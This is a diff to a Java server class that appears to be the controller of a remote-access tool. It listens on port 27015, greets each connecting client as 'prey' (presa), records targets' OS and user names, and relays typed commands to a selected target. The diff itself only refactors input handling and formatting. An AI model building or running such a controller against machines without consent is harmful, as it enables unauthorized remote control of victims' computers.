@@ -22,6 +22,7 @@ public class Server {
     private final static Map<ClientConnection, String> userOS = new HashMap<>();
     private static int id = 0;
     private static ClientConnection actualTarget;
+    private static Scanner sc = new Scanner(System.in);
 
     public static void main(String[] args) throws IOException {
         serverSocket = new ServerSocket(27015);
@@ -31,7 +32,9 @@ public class Server {
     }
 
     public static void clientConnection() {
-        Scanner sc = new Scanner(System.in);
+        // resetta scanner
+        sc = new Scanner(System.in);
+
         Socket clientSocket = null;
         try {
             clientSocket = serverSocket.accept();
@@ -40,14 +43,13 @@ public class Server {
             e.printStackTrace();
         }
         System.out.println("Opa temos uma presa kkkkk de ip " + clientSocket.getInetAddress() + ":" + clientSocket.getPort());
-
         Connection targetConnection = new Connection(clientSocket);
 
         runHandlerThread(targetConnection);
 
         String command;
         do {
-            System.out.println(ConsoleColors.BLUE + userString(actualTarget) + ConsoleColors.RESET+"\n");
+            System.out.println(ConsoleColors.BLUE + userString(actualTarget) + ConsoleColors.RESET + "\n");
             command = sc.nextLine();
             if(!isNullOrEmpty(command)) {
                 switch(command) {
@@ -72,6 +74,8 @@ public class Server {
                     default:
                         if(targets.isEmpty()) {
                             System.out.println("Chefe, a lista ta vazia");
+                        } else if(command.isEmpty()) {
+                            System.out.println("Mestre, comando ta vazio");
                         } else {
                             actualTarget.getConnection().sendMessage(new Message(command));
                         }
@@ -92,7 +96,7 @@ public class Server {
         userOS.put(c, os);
     }
 
-    public static void addUserSystemName(ClientConnection c, String user     ) {
+    public static void addUserSystemName(ClientConnection c, String user) {
         systemNames.put(c, user);
     }
 
